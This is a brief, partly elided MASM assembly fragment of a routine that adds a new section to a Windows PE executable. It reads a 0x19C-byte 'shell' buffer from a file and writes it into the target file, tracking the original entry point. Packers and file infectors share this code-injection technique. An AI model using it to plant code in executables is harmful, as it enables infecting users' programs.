...
_addNewSection	proc	_lpFileName,_lpSectionName
			...
			LOCAL 	@dwSec,@dwFile,@dwFileTemp,@dwNTHeader,@dwOEP,@dwImageBase  	
			pushad
			...
			mov	hShellFile,eax
			mov	edx,dwJmpOffset
			invoke	ReadFile,hShellFile,addr lpShellBuffer,19ch,addr @dwFileTemp,NULL
			invoke	SetFilePointer,hFile,@dwFile,NULL,FILE_BEGIN
			invoke	WriteFile,hFile,addr lpShellBuffer,19ch,addr @dwFileTemp,NULL
